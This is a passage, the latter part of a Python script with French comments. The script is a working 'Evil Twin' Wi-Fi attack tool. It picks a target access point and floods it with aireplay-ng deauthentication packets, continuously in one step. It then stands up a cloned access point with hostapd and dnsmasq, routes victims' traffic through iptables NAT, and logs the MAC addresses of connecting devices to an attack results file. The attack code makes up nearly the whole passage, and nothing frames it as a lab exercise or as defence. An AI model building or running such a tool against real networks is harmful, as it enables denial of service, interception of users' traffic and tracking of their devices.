            try:
                proc.wait(timeout=3)
                logger.info(f"aireplay-ng arrêté proprement après {elapsed}s")
            except subprocess.TimeoutExpired:
                proc.kill()
                logger.warning(f"aireplay-ng tué après {elapsed}s")
        
        if proc in active_processes:
            active_processes.remove(proc)
        
        print(f"{Colors.GREEN}[+] Déauthentification terminée après {elapsed}s{Colors.RESET}")
        logger.info(f"Déauthentification terminée: {elapsed}s")
    
    except KeyboardInterrupt:
        logger.info("Déauth interrompue par l'utilisateur")
        raise
    except Exception as e:
        logger.error(f"Erreur déauth: {e}")
        print(f"{Colors.RED}[-] Erreur: {e}{Colors.RESET}")

def create_fake_ap(mon_iface: str, ssid: str, channel: str, 
                  force_wpa: bool = True) -> Tuple[Optional[subprocess.Popen], Optional[subprocess.Popen]]:
    """
    CORRECTION CLÉE: hostapd doit tourner sur une interface RÉELLE, pas monitor
    
    Stratégie:
    1. Si on a une deuxième interface Wi-Fi, l'utiliser pour le faux AP
    2. Sinon, utiliser la même interface (nettoyer avant)
    """
    print(f"\n{Colors.GREEN}[+] Création du faux AP '{ssid}' canal {channel}...{Colors.RESET}")
    logger.info(f"Création faux AP: SSID={ssid}, Channel={channel}")
    
    # Vérifier les outils
    for tool in ['hostapd', 'dnsmasq']:
        result = subprocess.run(['which', tool], capture_output=True, text=True)
        if result.returncode != 0:
            logger.error(f"{tool} non installé")
            print(f"{Colors.RED}[-] {tool} non installé !{Colors.RESET}")
            return None, None
    
    log_file = None
    try:
        # CORRECTION: Configurer le canal
        print(f"{Colors.YELLOW}[*] Configuration du canal {channel}...{Colors.RESET}")
        execute_command(['iwconfig', mon_iface, 'channel', str(channel)])
        time.sleep(1)
        
        # Configuration hostapd MINIMALE mais COMPLÈTE
        hostapd_conf = f"""interface={mon_iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
wmm_enabled=1
ieee80211d=0
auth_algs=1
"""
        
        if force_wpa:
            print(f"{Colors.CYAN}[*] Ajout du WPA2...{Colors.RESET}")
            hostapd_conf += f"""wpa=2
wpa_passphrase={Config.HOSTAPD_PASSWORD}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
            print(f"{Colors.YELLOW}[!] Mot de passe: {Config.HOSTAPD_PASSWORD}{Colors.RESET}")
        
        with open(Config.HOSTAPD_CONF, 'w') as f:
            f.write(hostapd_conf)
        
        os.chmod(Config.HOSTAPD_CONF, 0o600)
        logger.debug(f"Config hostapd écrite: {Config.HOSTAPD_CONF}")
        
        # Configurer l'interface
        print(f"{Colors.YELLOW}[*] Configuration IP de {mon_iface}...{Colors.RESET}")
        execute_command(['ip', 'link', 'set', mon_iface, 'up'])
        execute_command(['ip', 'addr', 'flush', 'dev', mon_iface])
        execute_command(['ip', 'addr', 'add', f"{Config.GATEWAY_IP}/24", 'dev', mon_iface])
        logger.debug(f"{mon_iface} configurée avec {Config.GATEWAY_IP}/24")
        
        # Configuration dnsmasq
        dnsmasq_conf = f"""interface={mon_iface}
bind-interfaces
dhcp-range={Config.DHCP_RANGE},{Config.DHCP_LEASE}
dhcp-option=3,{Config.GATEWAY_IP}
dhcp-option=6,{Config.GATEWAY_IP}
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
log-facility={Config.HOSTAPD_LOG}
"""
        
        with open(Config.DNSMASQ_CONF, 'w') as f:
            f.write(dnsmasq_conf)
        
        os.chmod(Config.DNSMASQ_CONF, 0o600)
        logger.debug(f"Config dnsmasq écrite: {Config.DNSMASQ_CONF}")
        
        # Lancer hostapd
        print(f"{Colors.GREEN}[+] Démarrage de hostapd...{Colors.RESET}")
        log_file = open(Config.HOSTAPD_LOG, 'w')
        hostapd_proc = subprocess.Popen(
            ['hostapd', '-B', Config.HOSTAPD_CONF],
            stdout=log_file, stderr=subprocess.STDOUT, close_fds=True
        )
        active_processes.append(hostapd_proc)
        logger.info(f"hostapd lancé (PID {hostapd_proc.pid})")
        
        time.sleep(3)
        
        # Vérifier que hostapd tourne
        if hostapd_proc.poll() is not None:
            logger.error(f"hostapd s'est terminé immédiatement (code {hostapd_proc.returncode})")
            print(f"{Colors.RED}[-] hostapd n'a pas démarré !{Colors.RESET}")
            
            # Afficher les erreurs
            try:
                with open(Config.HOSTAPD_LOG, 'r') as f:
                    errors = f.read()
                    if errors:
                        logger.error(f"hostapd errors: {errors}")
                        print(f"{Colors.RED}[-] Erreurs: {errors[:200]}{Colors.RESET}")
            except:
                pass
            
            return None, None
        
        print(f"{Colors.GREEN}[+] hostapd actif{Colors.RESET}")
        
        # Lancer dnsmasq
        print(f"{Colors.GREEN}[+] Démarrage de dnsmasq...{Colors.RESET}")
        dnsmasq_proc = subprocess.Popen(
            ['dnsmasq', '-C', Config.DNSMASQ_CONF, '-d'],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            close_fds=True
        )
        active_processes.append(dnsmasq_proc)
        logger.info(f"dnsmasq lancé (PID {dnsmasq_proc.pid})")
        
        time.sleep(2)
        
        if dnsmasq_proc.poll() is not None:
            logger.error(f"dnsmasq s'est terminé (code {dnsmasq_proc.returncode})")
            print(f"{Colors.RED}[-] dnsmasq n'a pas démarré !{Colors.RESET}")
            return None, None
        
        print(f"{Colors.GREEN}[+] dnsmasq actif{Colors.RESET}")
        
        return hostapd_proc, dnsmasq_proc
    
    except OSError as e:
        logger.error(f"Erreur fichier: {e}")
        print(f"{Colors.RED}[-] Erreur fichier: {e}{Colors.RESET}")
        return None, None
    except Exception as e:
        logger.error(f"Erreur création faux AP: {e}")
        print(f"{Colors.RED}[-] Erreur: {e}{Colors.RESET}")
        return None, None
    finally:
        if log_file:
            try:
                log_file.close()
            except:
                pass

def setup_forwarding(inet_iface: str, mon_iface: str):
    """Configure le routage NAT pour les victimes"""
    print(f"\n{Colors.GREEN}[+] Configuration du routage {inet_iface} → {mon_iface}...{Colors.RESET}")
    logger.info(f"Routage: {inet_iface} → {mon_iface}")
    
    rules = [
        "echo 1 > /proc/sys/net/ipv4/ip_forward",
        "iptables --flush 2>/dev/null || true",
        "iptables --table nat --flush 2>/dev/null || true",
        "iptables --delete-chain 2>/dev/null || true",
        "iptables --table nat --delete-chain 2>/dev/null || true",
        f"iptables -t nat -A POSTROUTING -o {shlex.quote(inet_iface)} -j MASQUERADE",
        "iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT",
        f"iptables -A FORWARD -i {shlex.quote(mon_iface)} -j ACCEPT"
    ]
    
    for rule in rules:
        try:
            execute_command(rule, shell=True)
            logger.debug(f"iptables: {rule}")
        except Exception as e:
            logger.warning(f"iptables error: {e}")
    
    print(f"{Colors.GREEN}[+] Routage configuré{Colors.RESET}")
    logger.info("Routage configuré")

def monitor_connections(log_file: str):
    """Monitore les connexions clients en temps réel"""
    print(f"\n{Colors.CYAN}[*] Monitoring des connexions actif...{Colors.RESET}")
    logger.info(f"Monitoring démarré sur {log_file}")
    
    if not log_file or not os.path.exists(log_file):
        logger.warning(f"Fichier log introuvable: {log_file}")
        return
    
    try:
        with open(log_file, 'r') as f:
            f.seek(0, 2)  # Fin du fichier
            while True:
                line = f.readline()
                if not line:
                    time.sleep(0.5)
                    continue
                
                # Détecter une connexion
                if 'AP-STA-CONNECTED' in line:
                    match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                    if match:
                        mac = match.group(0)
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        print(f"{Colors.GREEN}[+] [{timestamp}] Client connecté: {mac}{Colors.RESET}")
                        captured_clients[mac] = {'time': timestamp, 'status': 'connected'}
                        logger.info(f"Client connecté: {mac}")
                
                # Détecter une tentative échouée
                if 'AP-STA-DISCONNECTED' in line or ('failed' in line.lower() and 'auth' in line.lower()):
                    match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                    if match:
                        mac = match.group(0)
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        if mac not in captured_clients or captured_clients[mac].get('status') != 'failed':
                            print(f"{Colors.RED}[!] [{timestamp}] Tentative échouée: {mac}{Colors.RESET}")
                            captured_clients[mac] = {'time': timestamp, 'status': 'failed'}
                            logger.info(f"Tentative échouée: {mac}")
    
    except KeyboardInterrupt:
        logger.info("Monitoring arrêté")
    except IOError as e:
        logger.error(f"Erreur IO monitoring: {e}")
    except Exception as e:
        logger.error(f"Erreur monitoring: {e}")

def save_results(target_ap: AccessPoint, inet_iface: str, mon_iface: str):
    """Sauvegarde les résultats de l'attaque en JSON"""
    try:
        results = {
            'timestamp': datetime.now().isoformat(),
            'target': asdict(target_ap),
            'interfaces': {
                'internet': inet_iface,
                'attack': mon_iface,
                'gateway': Config.GATEWAY_IP
            },
            'captured_clients': captured_clients,
            'logs': {
                'hostapd': Config.HOSTAPD_LOG,
                'main': Config.LOG_FILE
            }
        }
        
        results_file = f"{Config.CAPTURE_DIR}/attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        logger.info(f"Résultats sauvegardés: {results_file}")
        print(f"{Colors.GREEN}[+] Résultats: {results_file}{Colors.RESET}")
    
    except Exception as e:
        logger.error(f"Erreur sauvegarde résultats: {e}")

def main():
    """Fonction principale - orchestration de l'attaque complète"""
    global mon_iface_created
    
    require_root()
    Config.init_temp_files()
    banner()
    
    if not check_dependencies():
        sys.exit(1)
    
    inet_iface = None
    mon_iface = None
    target_ap = None
    atk_iface = None
    
    try:
        # === ÉTAPE 1: Sélection des interfaces ===
        inet_iface = choose_internet_interface()
        if not inet_iface:
            return
        
        print(f"\n{Colors.GREEN}[+] Interface Internet: {inet_iface}{Colors.RESET}")
        
        banner()
        
        atk_iface = choose_attack_interface()
        if not atk_iface:
            return
        
        print(f"\n{Colors.YELLOW}[!] L'interface {atk_iface} sera convertie en mode monitor{Colors.RESET}")
        
        # === ÉTAPE 2: Préparation ===
        kill_conflicts()
        
        mon_iface = start_monitor_airmon(atk_iface)
        if not mon_iface:
            print(f"{Colors.RED}[-] Impossible de créer une interface monitor{Colors.RESET}")
            restore_network(None, atk_iface)
            return
        
        # === ÉTAPE 3: Scan des APs ===
        aps = scan_aps(mon_iface)
        if not aps:
            print(f"{Colors.RED}[-] Aucun AP détecté !{Colors.RESET}")
            restore_network(mon_iface, atk_iface)
            return
        
        # === ÉTAPE 4: Sélection de la cible ===
        target_ap = select_ap(aps)
        if not target_ap:
            restore_network(mon_iface, atk_iface)
            return
        
        print(f"\n{Colors.BLUE}{'='*80}{Colors.RESET}")
        print(f"{Colors.CYAN}[TARGET] SSID: {target_ap.essid}{Colors.RESET}")
        print(f"{Colors.CYAN}[TARGET] BSSID: {target_ap.bssid}{Colors.RESET}")
        print(f"{Colors.CYAN}[TARGET] Channel: {target_ap.channel}{Colors.RESET}")
        print(f"{Colors.BLUE}{'='*80}{Colors.RESET}")
        logger.info(f"Cible: {target_ap.essid} ({target_ap.bssid})")
        
        # === ÉTAPE 5: Paramètres de l'attaque ===
        print(f"\n{Colors.ORANGE}[?] Configuration de l'attaque:{Colors.RESET}")
        
        deauth_input = input(f"{Colors.ORANGE}    Durée déauthentification (sec, défaut {Config.DEFAULT_DEAUTH_DURATION}): {Colors.RESET}").strip()
        deauth_duration = int(deauth_input) if deauth_input.isdigit() else Config.DEFAULT_DEAUTH_DURATION
        
        logger.info(f"Durée déauth: {deauth_duration}s")
        
        # === ÉTAPE 6: Verrouiller le canal ===
        lock_channel(mon_iface, target_ap.channel)
        
        # === ÉTAPE 7: Déauthentification aggressive ===
        aggressive_deauth(mon_iface, target_ap.bssid, deauth_duration)
        
        # === ÉTAPE 8: Créer le faux AP ===
        print(f"\n{Colors.YELLOW}[*] Création du faux AP...{Colors.RESET}")
        hostapd_proc, dnsmasq_proc = create_fake_ap(
            mon_iface, target_ap.essid, target_ap.channel, force_wpa=True
        )
        
        if not hostapd_proc or not dnsmasq_proc:
            logger.error("Échec création faux AP")
            print(f"{Colors.RED}[-] Échec de la création du faux AP{Colors.RESET}")
            cleanup()
            restore_network(mon_iface, atk_iface)
            return
        
        # === ÉTAPE 9: Configurer le routage ===
        setup_forwarding(inet_iface, mon_iface)
        
        # === ÉTAPE 10: Déauthentification continue ===
        print(f"\n{Colors.YELLOW}[*] Lancement de la déauthentification continue...{Colors.RESET}")
        continuous_deauth = subprocess.Popen(
            ['aireplay-ng', '--deauth', '0', '-a', target_ap.bssid, mon_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            close_fds=True
        )
        active_processes.append(continuous_deauth)
        logger.info("Déauthentification continue lancée")
        
        # === ÉTAPE 11: Monitoring des clients ===
        monitor_thread = threading.Thread(target=monitor_connections, args=(Config.HOSTAPD_LOG,), daemon=True)
        monitor_thread.start()
        
        # === AFFICHAGE FINAL ===
        print(f"\n{Colors.GREEN}{'='*100}{Colors.RESET}")
        print(f"{Colors.CYAN}[✓] EVIL TWIN ACTIF ET EN ATTENTE DE CLIENTS !{Colors.RESET}")
        print(f"{Colors.CYAN}  SSID: {target_ap.essid}{Colors.RESET}")
        print(f"{Colors.CYAN}  BSSID: {target_ap.bssid}{Colors.RESET}")
        print(f"{Colors.CYAN}  Canal: {target_ap.channel}{Colors.RESET}")
        print(f"{Colors.CYAN}  Interface monitor: {mon_iface}{Colors.RESET}")
        print(f"{Colors.CYAN}  Interface Internet: {inet_iface}{Colors.RESET}")
        print(f"{Colors.CYAN}  Gateway: {Config.GATEWAY_IP}{Colors.RESET}")
        print(f"{Colors.GREEN}{'='*100}{Colors.RESET}")
        
        print(f"\n{Colors.RED}[!] Déauthentification continue du vrai AP{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Les victimes seront forcées de se reconnecter{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Mot de passe du faux AP: {Config.HOSTAPD_PASSWORD}{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Connexions loggées: {Config.HOSTAPD_LOG}{Colors.RESET}")
        print(f"{Colors.GREEN}[!] Trafic routé via {inet_iface}{Colors.RESET}")
        print(f"\n{Colors.ORANGE}[*] Appuyez sur Ctrl+C pour arrêter...{Colors.RESET}\n")
        
        logger.info("=== ATTAQUE EN COURS ===")
        
        # === Boucle principale ===
        while True:
            time.sleep(1)
    
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Arrêt de l'Evil Twin...{Colors.RESET}")
        logger.warning("Arrêt demandé par l'utilisateur")
    
    except Exception as e:
        logger.error(f"Erreur non gérée: {e}")
        print(f"{Colors.RED}[-] Erreur: {e}{Colors.RESET}")
    
    finally:
        # Sauvegarder les résultats
        if target_ap is not None and inet_iface is not None and mon_iface is not None:
            save_results(target_ap, inet_iface, mon_iface_created if mon_iface_created else mon_iface)
        
        cleanup()
        restore_network(mon_iface_created if mon_iface_created else mon_iface, atk_iface)
        print(f"\n{Colors.GREEN}[+] Nettoyage terminé. Au revoir !{Colors.RESET}")
        logger.info("=== PROGRAMME TERMINÉ ===")

if __name__ == "__main__":
    main()